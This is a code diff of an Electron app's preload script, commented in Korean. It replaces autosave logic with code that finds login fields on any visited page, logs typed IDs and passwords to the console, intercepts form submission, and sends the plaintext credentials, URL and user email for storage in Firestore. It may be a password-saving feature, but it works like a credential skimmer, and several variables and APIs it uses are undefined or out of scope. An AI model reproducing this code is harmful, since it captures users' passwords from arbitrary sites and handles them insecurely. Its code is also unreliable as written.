@@ -78,80 +78,75 @@ contextBridge.exposeInMainWorld('electronAPI', {
   openUrlInNewWindow: (url) => ipcRenderer.send('open-url-in-new-window', url),
   saveSiteData: (data) => ipcRenderer.send('save-site-data', data),
 
-  // Firestore에 사이트 데이터 저장 요청을 보내는 함수
-  saveSiteData: async (data) => {
-    return new Promise((resolve, reject) => {
-      const userEmail = localStorage.getItem('userEmail'); // 로컬 스토리지에서 이메일 가져오기
-      console.log("로컬 스토리지에서 가져온 이메일:", userEmail);
-
-      if (userEmail) {
-        ipcRenderer.once('save-site-data-response', (event, success) => {
-          if (success) {
-            console.log("Firestore에 데이터 저장 성공");
-            resolve();
-          } else {
-            console.log("Firestore에 데이터 저장 실패");
-            reject();
-          }
-        });
-        ipcRenderer.send('save-site-data', { ...data, userEmail });
-      } else {
-        console.log("사용자가 로그인되어 있지 않거나 로컬 스토리지에서 이메일을 찾을 수 없습니다.");
-        reject();
-      }
-    });
+  // 이메일 정보를 로컬 스토리지에서 가져오는 메서드
+  
+  // 사이트 데이터를 저장하는 메서드
+  saveSiteData: async (siteData) => {
+    try {
+      // Firestore에 사이트 데이터를 저장 요청
+      await ipcRenderer.invoke('save-site-data', siteData);
+      console.log("Firestore에 사이트 데이터 저장 성공:", siteData);
+    } catch (error) {
+      console.error("Firestore에 사이트 데이터 저장 실패:", error);
+    }
   }
 });
 
-window.addEventListener('DOMContentLoaded', () => {
-  let saveTimeout;
 
-  function saveData() {
-    const idField = idSelectors.map(sel => document.querySelector(sel)).find(el => el);
-    const passwordField = passwordSelectors.map(sel => document.querySelector(sel)).find(el => el);
+window.addEventListener("DOMContentLoaded", async () => {
+  console.log("페이지 로드 완료 및 MutationObserver 설정");
 
-    if (idField && passwordField) {
-      const id = idField.value.trim();
-      const password = passwordField.value.trim();
-      const url = window.location.href;
+  try {
+    const userEmail = await ipcRenderer.invoke('get-user-email');
+    console.log("ipcRenderer로 가져온 이메일:", userEmail);
+    if (userEmail) {
+      localStorage.setItem('userEmail', userEmail);
+    } else {
+      console.warn("사용자가 로그인되어 있지 않거나 이메일을 가져올 수 없습니다.");
+    }
+  } catch (error) {
+    console.error("이메일 가져오기 실패:", error);
+  }
 
-      const userEmail = localStorage.getItem('userEmail'); // 로컬 스토리지에서 이메일 가져오기
-      if (userEmail && id && password) {
-        console.log("최종 데이터 저장 요청:", { id, password, url, userEmail });
-        window.electronAPI.saveSiteData({ id, password, url })
-          .then(() => console.log("Firestore에 데이터 저장 성공"))
-          .catch(error => console.log("Firestore 저장 실패:", error));
+  // ID와 비밀번호 필드 탐색 셀렉터 설정
+  const idSelectors = ['input[name="username"]', 'input[name="id"]', 'input[name="userid"]', 'input[name="usr_id"]', 'input[type="text"]'];
+  const passwordSelectors = ['input[name="password"]', 'input[name="pw"]', 'input[name="userpw"]', 'input[name="usr_pw"]', 'input[type="password"]'];
+
+  function captureLoginForm() {
+      const idField = document.querySelector(idSelectors.join(', '));
+      const passwordField = document.querySelector(passwordSelectors.join(', '));
+
+      if (idField && passwordField) {
+          console.log("ID와 비밀번호 입력 필드 감지됨");
+
+          idField.addEventListener('input', () => console.log("ID 필드 입력됨:", idField.value));
+          passwordField.addEventListener('input', () => console.log("Password 필드 입력됨:", passwordField.value));
+
+          const form = idField.closest('form') || passwordField.closest('form');
+          if (form) {
+              form.addEventListener('submit', (event) => {
+                  event.preventDefault();
+                  const id = idField.value.trim();
+                  const password = passwordField.value.trim();
+
+                  if (id && password && userEmail) {
+                      console.log("Firestore에 저장 요청 전송 전:", { id, password, url: window.location.href });
+                      window.api.send("save-site-data", { id, password, url: window.location.href, email: userEmail });
+
+                      // 페이지 전환 지연
+                      setTimeout(() => form.submit(), 2000);
+                  } else {
+                      console.log("사용자가 로그인되어 있지 않거나 필드 값이 비어 있습니다.");
+                  }
+              });
+          }
       } else {
-        console.log('사용자가 로그인되어 있지 않거나 필드 값이 비어 있습니다.');
+          console.log("입력 필드가 감지되지 않음");
       }
-    } else {
-      console.log("ID와 비밀번호 입력 필드를 찾을 수 없습니다.");
-    }
-  }
-
-  function scheduleSave() {
-    clearTimeout(saveTimeout);
-    saveTimeout = setTimeout(saveData, 1500); // 입력이 멈춘 후 1.5초 뒤에 저장
-  }
-
-  function monitorInputChanges() {
-    const idField = idSelectors.map(sel => document.querySelector(sel)).find(el => el);
-    const passwordField = passwordSelectors.map(sel => document.querySelector(sel)).find(el => el);
-
-    if (idField && passwordField) {
-      console.log("ID와 비밀번호 입력 필드 감지됨");
-      
-      idField.addEventListener('input', scheduleSave);
-      passwordField.addEventListener('input', scheduleSave);
-    } else {
-      console.log("입력 필드를 찾을 수 없음");
-    }
   }
 
   // MutationObserver 설정
-  const observer = new MutationObserver(monitorInputChanges);
+  const observer = new MutationObserver(captureLoginForm);
   observer.observe(document.body, { childList: true, subtree: true });
-  
-  // MutationObserver로 감지되지 않는 경우를 대비해, 주기적으로 필드를 검색
-  setInterval(monitorInputChanges, 2000); // 2초마다 필드 탐색 및 변경 감지 시도
+  captureLoginForm();
 });
